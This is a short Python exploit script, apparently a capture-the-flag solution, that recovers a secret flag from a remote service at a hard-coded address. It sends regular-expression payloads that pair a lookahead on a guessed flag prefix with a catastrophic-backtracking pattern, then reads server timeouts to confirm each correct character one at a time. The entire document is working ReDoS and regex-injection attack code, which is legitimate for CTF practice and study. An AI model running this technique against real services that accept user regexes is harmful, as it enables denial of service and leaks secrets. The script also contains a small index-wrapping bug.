#!/usr/bin/env python3
from pwn import *

def conn():
    return remote("20.199.93.34", 11007)


weird = ".*.*.*.*.*.*.*.*.*.*skdjf"

def gen_pay(known, c):
    guess = known + c
    return f"^(?={guess})" + weird

flag = ""

known = "ingeneer{GG_YoU_AR3"

chars = "_@0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}"

i = 0
while True:
    try:
        p = conn()
        c = chars[i]
        print(f'TRYING ==> {known + c}')
        pay = gen_pay(known, c)
        p.sendlineafter("guess the flag pls:", pay)
        p.settimeout(2)
        a = p.sock.recv(12)
        ##wrong char!
        print('WRONG')
        i = (i+1 % len(chars))
        p.close()
    except TimeoutError:
        print('correct sequence')
        i = 0
        known += c
        print(f"flag is {known}")
        p.close()
